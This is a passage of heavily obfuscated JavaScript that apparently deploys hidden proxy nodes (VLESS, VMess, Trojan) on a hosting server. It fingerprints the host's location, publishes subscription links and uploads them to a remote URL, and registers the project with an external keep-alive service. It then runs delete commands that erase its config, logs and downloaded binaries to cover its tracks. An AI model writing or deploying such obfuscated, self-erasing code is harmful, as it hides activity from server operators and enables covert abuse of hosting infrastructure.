axios[_0x28a9e6(_0x40b389._0x4b7667)](_0x28a9e6(0x16d),{'timeout':0xbb8});if(_0x32d044[_0x28a9e6(_0x40b389._0x1e188c)]&&_0x32d044[_0x28a9e6(_0x40b389._0x2409db)][_0x28a9e6(_0x40b389._0x34d438)]===_0x28a9e6(_0x40b389._0x3290cf)&&_0x32d044[_0x28a9e6(0x1ab)]['countryCode']&&_0x32d044['data']['org'])return _0x32d044['data']['countryCode']+'_'+_0x32d044[_0x28a9e6(_0x40b389._0x8ff64a)][_0x28a9e6(_0x40b389._0x20d009)];}catch(_0x4fa69f){}}return'Unknown';}async function _0x120484(_0x5bcf0c){const _0x11b546={_0x5d473c:0x187,_0x44b0f3:0x197,_0x50e652:0x1cd,_0x120903:0x1e1,_0x2a441b:0x190,_0x20f2ae:0x122,_0x20e013:0x195,_0x41416a:0x1d0,_0x35124e:0x1e2,_0x28b8ae:0x150,_0x220e31:0x1a7},_0x38c2a1=await _0x8f80f2(),_0x4e3e6c=NAME?NAME+'-'+_0x38c2a1:_0x38c2a1;return new Promise(_0x1db1eb=>{setTimeout(()=>{const _0x543c3a={_0x35c3b8:0x122,_0x485b17:0x135,_0x2f3c7d:0x1c5,_0x5bf97a:0x1c1},_0x539c20=_0x26f4,_0x6b22ce={'v':'2','ps':''+_0x4e3e6c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x539c20(0x18f),'host':_0x5bcf0c,'path':_0x539c20(_0x11b546._0x5d473c),'tls':'tls','sni':_0x5bcf0c,'alpn':'','fp':_0x539c20(_0x11b546._0x44b0f3)},_0x481f18=_0x539c20(0x129)+UUID+'@'+CFIP+':'+CFPORT+_0x539c20(_0x11b546._0x50e652)+_0x5bcf0c+_0x539c20(_0x11b546._0x120903)+_0x5bcf0c+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x4e3e6c+_0x539c20(0x1a9)+Buffer[_0x539c20(0x150)](JSON[_0x539c20(_0x11b546._0x2a441b)](_0x6b22ce))['toString'](_0x539c20(_0x11b546._0x20f2ae))+_0x539c20(_0x11b546._0x20e013)+UUID+'@'+CFIP+':'+CFPORT+_0x539c20(_0x11b546._0x41416a)+_0x5bcf0c+'&fp=firefox&type=ws&host='+_0x5bcf0c+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x4e3e6c+_0x539c20(0x13b);console[_0x539c20(_0x11b546._0x35124e)](Buffer[_0x539c20(_0x11b546._0x28b8ae)](_0x481f18)[_0x539c20(_0x11b546._0x220e31)]('base64')),fs[_0x539c20(0x1ba)](subPath,Buffer[_0x539c20(_0x11b546._0x28b8ae)](_0x481f18)[_0x539c20(0x1a7)](_0x539c20(0x122))),console[_0x539c20(0x1e2)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x539c20(0x128)]('/'+SUB_PATH,(_0x270782,_0x3b7c9b)=>{const _0x28a003=_0x539c20,_0x156b46=Buffer[_0x28a003(0x150)](_0x481f18)[_0x28a003(0x1a7)](_0x28a003(_0x543c3a._0x35c3b8));_0x3b7c9b[_0x28a003(_0x543c3a._0x485b17)](_0x28a003(_0x543c3a._0x2f3c7d),_0x28a003(_0x543c3a._0x5bf97a)),_0x3b7c9b[_0x28a003(0x13c)](_0x156b46);}),_0x1db1eb(_0x481f18);},0x7d0);});}}async function uploadNodes(){const _0x4acfee={_0x5b5f97:0x151,_0x1180a2:0x1c3,_0x3c0b9a:0x118,_0x154a25:0x1c3,_0x45f10d:0x19d,_0x5660d4:0x190,_0x36ed13:0x1e0},_0x181866=_0x2f95b2;if(UPLOAD_URL&&PROJECT_URL){const _0x5e9868=PROJECT_URL+'/'+SUB_PATH,_0x33f833={'subscription':[_0x5e9868]};try{const _0x319ab7=await axios[_0x181866(_0x4acfee._0x5b5f97)](UPLOAD_URL+_0x181866(0x156),_0x33f833,{'headers':{'Content-Type':_0x181866(0x166)}});return _0x319ab7&&_0x319ab7[_0x181866(_0x4acfee._0x1180a2)]===0xc8?(console[_0x181866(0x1e2)](_0x181866(0x196)),_0x319ab7):null;}catch(_0x1a453a){if(_0x1a453a[_0x181866(_0x4acfee._0x3c0b9a)]){if(_0x1a453a[_0x181866(_0x4acfee._0x3c0b9a)][_0x181866(_0x4acfee._0x154a25)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x263318=fs[_0x181866(0x1aa)](listPath,_0x181866(0x144)),_0x4fba66=_0x263318['split']('\x0a')[_0x181866(0x17d)](_0x4158b4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x181866(0x125)](_0x4158b4));if(_0x4fba66[_0x181866(_0x4acfee._0x45f10d)]===0x0)return;const _0x12f392=JSON[_0x181866(_0x4acfee._0x5660d4)]({'nodes':_0x4fba66});try{const _0x28afdf=await axios[_0x181866(0x151)](UPLOAD_URL+_0x181866(_0x4acfee._0x36ed13),_0x12f392,{'headers':{'Content-Type':_0x181866(0x166)}});return _0x28afdf&&_0x28afdf[_0x181866(0x1c3)]===0xc8?(console[_0x181866(0x1e2)](_0x181866(0x165)),_0x28afdf):null;}catch(_0xd17359){return null;}}else return;}}function _0x26f4(_0x5ef965,_0x88695f){const _0x38b208=_0x38b2();return _0x26f4=function(_0x26f431,_0x5e3a9e){_0x26f431=_0x26f431-0x117;let _0x2f90ae=_0x38b208[_0x26f431];return _0x2f90ae;},_0x26f4(_0x5ef965,_0x88695f);}function cleanFiles(){const _0x491d39={_0x23ff29:0x182,_0x2cd383:0x16b,_0x2a52f5:0x1c8};setTimeout(()=>{const _0x2bad99={_0x23778d:0x12d},_0x3a46bc={_0x213c14:0x12d,_0x5ef230:0x1e2},_0x5e4c71=_0x26f4,_0x25e2fa=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x25e2fa['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x25e2fa[_0x5e4c71(0x134)](phpPath);process[_0x5e4c71(_0x491d39._0x23ff29)]===_0x5e4c71(0x1bf)?exec('del\x20/f\x20/q\x20'+_0x25e2fa['join']('\x20')+_0x5e4c71(_0x491d39._0x2cd383),_0x2b9832=>{const _0x3efe18=_0x5e4c71;console[_0x3efe18(_0x3a46bc._0x213c14)](),console[_0x3efe18(0x1e2)](_0x3efe18(0x1bb)),console[_0x3efe18(_0x3a46bc._0x5ef230)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x5e4c71(0x1b4)+_0x25e2fa[_0x5e4c71(_0x491d39._0x2a52f5)]('\x20')+'\x20>/dev/null\x202>&1',_0x57a7af=>{const _0x43cf30=_0x5e4c71;console[_0x43cf30(_0x2bad99._0x23778d)](),console[_0x43cf30(0x1e2)](_0x43cf30(0x1bb)),console['log'](_0x43cf30(0x127));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3a7fa6={_0x3f8c0d:0x1e2,_0x5be9f5:0x167,_0x2a5ea2:0x166,_0x4a4183:0x1e2,_0x2128df:0x1cc,_0x38a017:0x12e,_0xfd21e4:0x1b7},_0xaa5631=_0x2f95b2;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xaa5631(_0x3a7fa6._0x3f8c0d)](_0xaa5631(0x1dc));return;}try{const _0x3620bc=await axios[_0xaa5631(0x151)](_0xaa5631(_0x3a7fa6._0x5be9f5),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xaa5631(_0x3a7fa6._0x2a5ea2)}});return console[_0xaa5631(_0x3a7fa6._0x4a4183)](_0xaa5631(_0x3a7fa6._0x2128df)),_0x3620bc;}catch(_0x173119){return console[_0xaa5631(_0x3a7fa6._0x38a017)](_0xaa5631(_0x3a7fa6._0xfd21e4)+_0x173119[_0xaa5631(0x17c)]),null;}}async function startserver(){const _0x33fc7d={_0x6e856c:0x12e,_0x1d2de5:0x16c},_0x7d3bf6=_0x2f95b2;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x52b9bd){console[_0x7d3bf6(_0x33fc7d._0x6e856c)](_0x7d3bf6(_0x33fc7d._0x1d2de5),_0x52b9bd);}}startserver()[_0x2f95b2(0x1ae)](_0x31dd14=>{const _0x4b5b17=_0x2f95b2;console[_0x4b5b17(0x12e)]('Unhandled\x20error\x20in\x20startserver:',_0x31dd14);}),app['listen'](PORT,()=>console[_0x2f95b2(0x1e2)](_0x2f95b2(0x173)+PORT+'!'));
